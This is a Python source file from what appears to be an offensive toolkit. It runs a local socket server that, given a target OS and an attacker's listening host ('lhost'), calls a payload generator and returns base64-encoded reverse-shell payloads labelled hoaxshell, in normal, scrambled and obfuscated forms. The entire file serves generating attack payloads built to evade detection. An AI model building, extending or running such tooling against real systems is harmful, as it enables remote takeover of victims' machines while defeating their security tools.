import socket
from json import loads, dumps
from villan_core import payloadGen
from base64 import b64encode

class socketPayloadGen:
    """make payloads when info over socket is recived, unix-sock like"""

    def __init__(self) -> None:
        self.port = 64901
        self.errByte = "ERR".encode("utf-8")
        self.ackByte = "ACK".encode("utf-8")
        pass

    def start(self):
        uSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        uSock.bind(("127.0.0.1", self.port))

        print("[+] hoaxshell payload socket started on 127.0.0.1:{}".format(self.port))

        while True:
            uSock.listen(1)
            conn, addr = uSock.accept()

            with conn:
                while True:
                    r = conn.recv(2048).decode("utf-8")

                    if r:
                        try:
                            parsed = loads(r)

                            if "exit" in [x for x in parsed]: return

                            if parsed["os"]:
                                if parsed["lhost"]:
                                    if parsed["scramNum"]:
                                        payload = payloadGen(parsed["os"], parsed["lhost"], scramble=int(parsed["scramNum"]))
                                        conn.sendall(dumps({
                                            "normal": b64encode(payload.payload.encode("ascii")).decode("ascii"),
                                            "scrambled": b64encode(payload.scrambled.encode("ascii")).decode("ascii"),
                                            "obfuscated": b64encode(payload.obfuscated.encode("ascii")).decode("ascii")
                                        }).encode("utf-8"))
                        except Exception as e:
                            print("exception: {}".format(str(e)))
                            conn.sendall(self.errByte)
                    else:
                        break